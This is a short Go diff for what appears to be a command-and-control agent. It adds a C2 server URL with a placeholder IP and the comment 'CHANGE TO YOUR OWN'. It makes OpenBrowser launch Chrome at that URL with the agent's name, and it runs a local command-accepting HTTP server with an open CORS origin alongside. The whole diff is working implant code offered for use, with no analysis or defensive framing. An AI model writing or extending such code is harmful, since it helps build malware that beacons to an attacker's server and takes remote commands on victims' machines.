@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"os/exec"
 	"strings"
+
 )
 
 
@@ -17,6 +18,8 @@ var Commands []string
 var Data []string
 var port = 8081
 var AccessOrigin = "*"
+var C2Url = "http://?.?.?.?:8080/main/" // C2 URL . CHANGE TO YOUR OWN
+
 
 func GetAgentName() string{
 	// To be implemented
@@ -79,7 +82,15 @@ func AddCommand(w http.ResponseWriter, r *http.Request){
 }
 
 
-func OpenBrowser(){}
+func OpenBrowser(){
+	BrowserPath := "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
+
+	_, err := exec.Command(BrowserPath, C2Url+GetAgentName()).Output()
+	if err != nil {
+		fmt.Println(err)
+	}
+	return
+}
 
 func main()  {
 
@@ -92,6 +103,7 @@ func main()  {
 		Handler:listener,
 
 	}
-	server.ListenAndServe()
+	go server.ListenAndServe()
+	OpenBrowser()
 
 }
